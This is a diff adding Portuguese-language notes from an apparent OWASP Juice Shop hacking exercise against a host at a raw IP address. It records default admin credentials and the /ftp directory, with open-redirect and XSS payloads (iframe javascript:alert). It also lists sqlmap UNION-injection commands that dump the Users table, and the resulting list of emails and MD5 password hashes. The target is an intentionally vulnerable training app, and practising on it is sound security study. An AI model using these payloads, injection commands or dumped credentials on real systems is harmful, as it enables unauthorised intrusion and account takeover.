@@ -1,0 +1,66 @@
+admin@juice-sh.op user
+admin123 Senha
+Mais user:
+
+admin@juice-sh.op
+uvogin@juice-sh.op
+bender@juice-sh.op
+mc.safesearch@juice-sh.op
+jim@juice-sh.op
+morty@juice-sh.op
+bjoern@owasp.org
+
+Diretorio importante:
+
+/ftp
+
+
+Redirect
+
+http://98.81.71.8/redirect?to=http://example.com?https://github.com/bkimminich/juice-shop
+
+
+Xss 
+
+http://98.81.71.8/#/search?q=apple<input type="text" placeholder="Digite algo aqui">
+<<script>TESTE</script>iframe src="javascript:alert(`xss`)">teste -- feito do cometario
+
+score-board achado
+administration achado
+
+http://98.81.71.8/#/score-board
+
+xxe 
+http://98.81.71.8/score-board#/search?q=apple<iframe src="javascript:alert(`xss`)">.
+
+
+SQL:
+sqlmap -u " http://98.81.71.8/rest/products/search?q=123"  --no-cast --level=2 --dbms=SQLite --technique u
+
+sqlmap -u " http://98.81.71.8/rest/products/search?q=123"  --no-cast --level=2 --dbms=SQLite --technique u --tables
+sqlmap -u "http://98.81.71.8/rest/products/search?q=123" \
+--dbms=SQLite \
+--technique=U \
+--no-cast \
+--threads=1 \
+--sql-query="SELECT sql FROM sqlite_master WHERE name='Users'"
+
+sqlmap -u " http://98.81.71.8/rest/products/search?q=123"  --dbms=sqlite --technique u --level=2 --no-cast -T Users -C email,password --dump 
+| admin@juice-sh.op          | 0192023a7bbd73250516f069df18b500 |
+| jim@juice-sh.op            | e541ca7ecf72b8d1286474fc613e5e45 |
+| bender@juice-sh.op         | 0c36e517e3fa95aabf1bbffc6744a4ef |
+| bjoern.kimminich@gmail.com | 6edd9d726cbdc873c539e41ae8757b8c |
+| ciso@juice-sh.op           | 861917d5fa5f1172f931dc700d81a8fb |
+| support@juice-sh.op        | d57386e76107100a7d6c2782978b2e7b |
+| morty@juice-sh.op          | f2f933d0bb0ba057bc8e33b8ebd6d9e8 |
+| mc.safesearch@juice-sh.op  | b03f4b0ba8b458fa0acdc02cdb953bc8 |
+| J12934@juice-sh.op         | 3c2abc04e4a6ea8f1327d0aae3714b7d |
+| wurstbrot@juice-sh.op      | 9ad5b0492bbe528583e128d2a8941de4 |
+| amy@juice-sh.op            | 030f05e45e30710c3ad3c32f00de0473 |
+| bjoern@juice-sh.op         | 7f311911af16fa8f418dd1a3051d6810 |
+| bjoern@owasp.org           | 9283f1b2e9669749081963be0462e466 |
+| chris.pike@juice-sh.op     | 10a783b9ed19ea1c67c3a27699f0095b |
+| accountant@juice-sh.op     | 963e10f92a70b4b463220cb4c5d636dc |
+| uvogin@juice-sh.op         | 05f92148b4b60f7dacd04cceebb8f1af |
+| demo                       | fe01ce2a7fbac8fafaed7c982a04e229 |
+| teste@gmail.com            | e10adc3949ba59abbe56e057f20f883e |
